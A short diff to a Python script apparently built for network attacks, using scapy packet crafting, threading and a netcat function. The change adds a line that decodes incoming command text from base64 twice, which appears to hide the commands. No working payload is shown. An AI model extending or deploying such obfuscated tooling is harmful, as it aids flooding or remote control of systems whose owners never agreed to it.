@@ -12,6 +12,8 @@ import socket
 from random import randint , choice
 import threading
 from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR
+import base64
+
 
 conf.verb = 0
 threads = 10
@@ -129,6 +131,8 @@ def netcat():
 def main(output):
 
     print(output)
+
+    decoded_twice = base64.b64decode(base64.b64decode(output.encode())).decode()
 
     parts = output.split()
 
